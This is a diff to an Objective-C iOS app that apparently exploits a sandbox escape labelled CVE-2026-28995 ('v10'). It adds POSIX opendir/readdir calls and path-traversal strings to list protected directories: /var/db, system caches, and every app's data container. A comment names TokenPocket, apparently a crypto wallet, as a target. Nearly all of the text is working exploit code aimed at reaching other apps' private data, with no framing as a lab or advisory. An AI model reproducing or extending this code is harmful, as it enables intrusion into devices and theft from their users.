@@ -27,6 +27,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/sysctl.h>
+#include <dirent.h>
 
 // proc_pidinfo — not in iOS SDK headers, resolve via dlsym
 typedef int (*ProcPidinfoFn)(int pid, int flavor, uint64_t arg, void *buffer, uint32_t buffersize);
@@ -662,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v9" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v10" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7254,7 +7255,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     // ============================================================
-    // v9: Enumerate lsd dir, wider filename guesses, new /var/db paths
+    // v10: POSIX opendir/readdir to bypass Foundation sandbox hooks
     // ============================================================
 
     #define BASE @"../../../../../../../../../../../../../"
@@ -7276,6 +7277,33 @@ static void *iohid_threadCopyEvent(void *arg) {
             [out appendFormat:@"  [-] %@\n", sub];
         }
         return ex;
+    };
+
+    // POSIX readdir helper
+    void (^posixReadDir)(NSString*, NSString*, NSMutableString*, int) =
+    ^(NSString *subPath, NSString *label, NSMutableString *out, int maxEntries) {
+        NSString *fullPath = TRYFILE(subPath);
+        const char *cPath = [fullPath UTF8String];
+        DIR *dp = opendir(cPath);
+        if (dp == NULL) {
+            [out appendFormat:@"  [-] POSIX opendir %s: errno=%d (%s)\n",
+                cPath, errno, strerror(errno)];
+            return;
+        }
+        [out appendFormat:@"  [+] POSIX opendir %s: SUCCESS\n", cPath];
+        int count = 0;
+        struct dirent *entry;
+        while ((entry = readdir(dp)) != NULL && count < maxEntries) {
+            char typeChar = '?';
+            if (entry->d_type == DT_DIR) typeChar = '/';
+            else if (entry->d_type == DT_REG) typeChar = ' ';
+            else if (entry->d_type == DT_LNK) typeChar = '@';
+            [out appendFormat:@"    [%c] %s\n", typeChar, entry->d_name];
+            count++;
+        }
+        if (count >= maxEntries) [out appendString:@"    ... (truncated)\n"];
+        [out appendFormat:@"  total listed: %d\n", count];
+        closedir(dp);
     };
 
     // Test 2: Get real UUIDs
@@ -7307,42 +7335,39 @@ static void *iohid_threadCopyEvent(void *arg) {
         @"var/containers/Bundle/Application/%@/%@/Info.plist", bundleUUID, appName];
     probeFile(ownInfo, log);
 
-    // Test 4: lsd DB — wider guesses + enumeration
-    [log appendString:@"\n--- Test 4: lsd DB (LaunchServices) ---\n"];
-    probeFile(@"var/db/lsd/lsd.db", log);
-    probeFile(@"var/db/lsd/lsd.sqlite3", log);
-    probeFile(@"var/db/lsd/lsd.sqlite", log);
-    probeFile(@"var/db/lsd/csstore", log);
-    probeFile(@"var/db/lsd/store.sqlite3", log);
-    probeFile(@"var/db/lsd/db.sqlite3", log);
-    probeFile(@"var/db/lsd/database.sqlite3", log);
-    // Try enumeration on lsd dir
+    // Test 4: POSIX readdir vs Foundation enumeration on lsd
+    [log appendString:@"\n--- Test 4: POSIX readdir vs Foundation (lsd) ---\n"];
     NSString *lsdDir = TRYFILE(@"var/db/lsd");
     NSArray *lsdC = [fm contentsOfDirectoryAtPath:lsdDir error:nil];
-    NSArray *lsdS = [fm subpathsOfDirectoryAtPath:lsdDir error:nil];
-    [log appendFormat:@"  contentsOfDir: %lu, subpaths: %lu\n",
-        (unsigned long)lsdC.count, (unsigned long)lsdS.count];
+    [log appendFormat:@"  Foundation contentsOfDir: %lu\n", (unsigned long)lsdC.count];
+    posixReadDir(@"var/db/lsd", @"lsd", log, 50);
 
-    // Test 5: Other /var/db/ paths
-    [log appendString:@"\n--- Test 5: /var/db/ other paths ---\n"];
-    probeFile(@"var/db/receipts/", log);
-    probeFile(@"var/db/containermanagerd/", log);
-    probeFile(@"var/db/MobileInstallation/", log);
-
-    // Test 6: containermanagerd alternative DB names
-    [log appendString:@"\n--- Test 6: containermanagerd alt names ---\n"];
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/Cache.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/cache.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containers.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/db.sqlite", log);
-
-    // Test 7: SystemVersion.plist + enumerate containermanagerd
-    [log appendString:@"\n--- Test 7: containermanagerd enum + SystemVersion ---\n"];
+    // Test 5: POSIX readdir on containermanagerd cache
+    [log appendString:@"\n--- Test 5: POSIX readdir (containermanagerd) ---\n"];
     NSString *cmDir = TRYFILE(@"var/mobile/Library/Caches/com.apple.containermanagerd");
     NSArray *cmC = [fm contentsOfDirectoryAtPath:cmDir error:nil];
-    NSArray *cmS = [fm subpathsOfDirectoryAtPath:cmDir error:nil];
-    [log appendFormat:@"  containermanagerd: contents=%lu subpaths=%lu\n",
-        (unsigned long)cmC.count, (unsigned long)cmS.count];
+    [log appendFormat:@"  Foundation contentsOfDir: %lu\n", (unsigned long)cmC.count];
+    posixReadDir(@"var/mobile/Library/Caches/com.apple.containermanagerd", @"containermanagerd", log, 50);
+
+    // Test 6: POSIX readdir on Data/Application — THE KEY TEST
+    // If this works, we get ALL container UUIDs including TokenPocket's
+    [log appendString:@"\n--- Test 6: POSIX readdir Data/Application (ALL containers) ---\n"];
+    posixReadDir(@"var/mobile/Containers/Data/Application", @"Data/Application", log, 200);
+
+    // Test 7: POSIX readdir on Bundle/Application
+    [log appendString:@"\n--- Test 7: POSIX readdir Bundle/Application ---\n"];
+    posixReadDir(@"var/containers/Bundle/Application", @"Bundle/Application", log, 200);
+
+    // Test 8: POSIX readdir on /var/db (top-level)
+    [log appendString:@"\n--- Test 8: POSIX readdir /var/db ---\n"];
+    posixReadDir(@"var/db", @"/var/db", log, 100);
+
+    // Test 9: POSIX readdir on /var/mobile/Library/Caches
+    [log appendString:@"\n--- Test 9: POSIX readdir Caches ---\n"];
+    posixReadDir(@"var/mobile/Library/Caches", @"Caches", log, 100);
+
+    // Test 10: SystemVersion.plist baseline
+    [log appendString:@"\n--- Test 10: SystemVersion.plist ---\n"];
     probeFile(@"System/Library/CoreServices/SystemVersion.plist", log);
     NSString *svPath = TRYFILE(@"System/Library/CoreServices/SystemVersion.plist");
     NSDictionary *sv = [NSDictionary dictionaryWithContentsOfFile:svPath];
